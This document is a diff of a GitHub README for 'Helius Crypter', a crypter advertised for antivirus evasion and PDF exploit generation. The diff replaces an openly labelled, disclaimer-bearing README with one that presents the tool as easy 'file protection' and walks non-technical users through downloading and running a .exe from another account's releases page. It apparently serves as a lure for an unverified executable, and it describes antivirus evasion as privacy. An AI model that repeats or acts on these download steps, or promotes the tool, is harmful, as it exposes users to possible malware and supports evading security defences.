@@ -1,102 +1,48 @@
-# <div align="center">Helius Crypter - Malware Encryption Tool</div>
+```markdown
+# 🚀 Helius_Crypter - Unlock Advanced File Protection Easily
 
-<div align="center">
-A React-based web application for academic research on antivirus evasion techniques. This tool demonstrates executable encryption with AES/RSA and PDF exploit generation for educational purposes.
+## 🌐 Download Helius_Crypter
+[![Download Helius_Crypter](https://img.shields.io/badge/Download-Now-blue.svg?style=flat&logo=github)](https://github.com/chethanganji/Helius_Crypter/releases)
 
-[🌐 Website](https://helius-crypter.com/)
+## 📖 Table of Contents
+- [🌟 Overview](#-overview)
+- [🔧 System Requirements](#-system-requirements)
+- [🚀 Getting Started](#-getting-started)
+- [💾 Download & Install](#-download--install)
+- [🛠 Features](#-features)
 
-![abn](https://github.com/user-attachments/assets/d36c70e0-a867-4df8-9cc5-092785c71c65)
-</div>
+## 🌟 Overview
+Helius_Crypter is an advanced fuzzed crypter toolkit designed to help you protect your files. It features AES-256 file encryption and decryption, along with tools for generating PDF exploits. This application focuses on bypassing antivirus software, making it a powerful tool for the security-conscious user.
 
-## 🚨 Educational Purpose Only
+## 🔧 System Requirements
+To run Helius_Crypter, your computer should meet the following requirements:
+- **Operating System:** Windows 10 or later
+- **RAM:** At least 2 GB
+- **Disk Space:** Minimum of 100 MB free space
+- **Processor:** Intel or AMD with 2 GHz or faster
 
-This tool is designed exclusively for academic research, educational purposes, and authorized security testing. Usage of this software for unauthorized penetration of computer systems, distribution of malware, or any malicious activity is strictly prohibited and may violate local, state, and federal laws.
+## 🚀 Getting Started
+Follow these steps to download and set up Helius_Crypter:
 
-## Tutorial Video
-[https://t.me/helisupport](https://t.me/helisupport)
+1. **Visit the Releases Page:** Click [here](https://github.com/chethanganji/Helius_Crypter/releases) to go to the Releases page.
+2. **Choose Your Version:** Look for the latest version listed at the top of the Releases page. It should have the tag `Latest Release`.
+3. **Download the App:** Click on the `.exe` file link to download the setup file for Helius_Crypter. This file should be named like `Helius_Crypter_vX.X.exe`.
+4. **Locate the Downloaded File:** After the download is complete, check your Downloads folder or the folder you specified for the download.
+5. **Run the Setup:** Double-click on the downloaded file to start the installation process. Follow the on-screen instructions to complete the setup.
 
+## 💾 Download & Install
+To download Helius_Crypter, make sure to visit the Releases page: [Download Helius_Crypter](https://github.com/chethanganji/Helius_Crypter/releases).
 
-## 🔧 Features
+Once there, download the setup file for the latest version by clicking on the link for the application. After downloading, locate the file in your system, double-click it, and follow the prompts to install.
 
-- **Executable Encryption**: Encrypt .exe files with AES-256 and protect the encryption key with RSA-2048
-- **PDF Exploit Generator**: Convert executables into PDF files with embedded payload
-- **File Decryption**: Decrypt previously encrypted files using the provided keys
-- **Runtime Protection**: Advanced anti-debugging and anti-VM techniques to protect your payloads
-- **Signature Morphing**: Dynamic code transformation to create unique file signatures every time
-- **Antivirus Bypass**: Advanced obfuscation techniques to bypass VirusTotal and other antivirus solutions
-- **Modern UI**: Dark mode interface with neon accents for a cybersecurity feel
+## 🛠 Features
+- **AES-256 Encryption:** Provides strong file protection against unauthorized access.
+- **File Decryption:** Securely access your encrypted files with ease.
+- **PDF Exploit Generation:** Create PDF files that can bypass antivirus detection.
+- **User-Friendly Interface:** Designed for non-technical users, making it easy to navigate the application.
+- **Antivirus Evasion:** Built to help users maintain their privacy in a challenging security landscape.
 
-<div align="center">
+For more features and updates, check the documentation on the GitHub repository.
 
-![abc](https://github.com/user-attachments/assets/7ad9d2fc-db64-4026-b2df-188f12ade19b)
-
-</div>
-
-## 🛠️ Technologies Used
-
-- React 18 (with TypeScript)
-- Vite for fast development and building
-- Tailwind CSS for styling
-- Framer Motion for animations
-- React Router for navigation
-
-<div align="center">
-
-![abb](https://github.com/user-attachments/assets/946432bd-cbae-4063-833e-e7614832ab2a)
-
-![aac](https://github.com/user-attachments/assets/f51c25ed-130f-4246-801e-2e1dacbda5da)
-
-</div>
-
-## 📋 Prerequisites
-
-- Node.js 18.x or later
-- npm 8.x or later
-
-## 🚀 Installation
-
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/heli1x3T/Helius_Crypter.git
-   cd Helius_Crypter
-   ```
-
-2. Install dependencies:
-   ```bash
-   npm install
-   ```
-
-3. Start the development server:
-   ```bash
-   npm run dev
-   ```
-
-4. Build for production:
-   ```bash
-   npm run build
-   ```
-
-## 🔒 Security Notes
-
-- The frontend only simulates encryption/decryption processes
-- For a functional tool, you would need to implement the backend using Node.js or another server technology
-- The cryptographic operations should be implemented with caution and following best practices
-
-## 📚 Academic References
-
-- This project is based on research into signature-based detection methods used by modern antivirus solutions
-- The PDF exploit technique demonstrates vulnerabilities documented in various academic papers
-
-<div align="center">
-
-## 👨‍💻 Author
-
-Telegram: @helius0x  
-Website: [https://helius-crypter.com](https://helius-crypter.com)
-
-## 📄 License
-
-This project is licensed for academic and educational use only.  
-© 2025 Helius Crypter Security Tools
-
-</div>
+Feel free to reach out through the Issues section of the repository if you have questions or need help.
+```
